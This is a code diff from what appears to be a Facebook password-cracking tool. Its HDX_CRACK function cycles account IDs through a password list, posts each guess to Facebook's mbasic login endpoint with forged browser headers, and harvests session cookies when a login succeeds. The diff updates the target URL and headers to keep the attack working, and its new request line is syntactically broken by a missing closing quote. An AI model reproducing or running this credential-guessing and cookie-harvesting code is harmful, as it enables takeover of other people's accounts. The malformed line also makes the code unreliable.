@@ -460,22 +460,20 @@ def HDX_CRACK(ids,passlist,tl):
             "pass":pas,
             "login":"Log In"}
             header_freefb = {
-            'authority': 'm.alpha.facebook.com',
-            'method': 'GET',
+            'authority': 'mbasic.facebook.com',
+            'method': 'POST',
+            'path': '/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8',
             'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-AS,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
             'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://mbasic.facebook.com',
+            'referer': 'https://mbasic.facebook.com/login/device-based/regular/login/?login_attempt=1&refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro}
-            lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fmbasic.facebook.com%2F&refsrc=deprecated&lwv=100&refid=9',data=log_data,headers=header_freefb).text
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36 Edg/86.0.622.38'
+}
+            lo = session.post('https://mbasic.facebook.com//login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8,data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
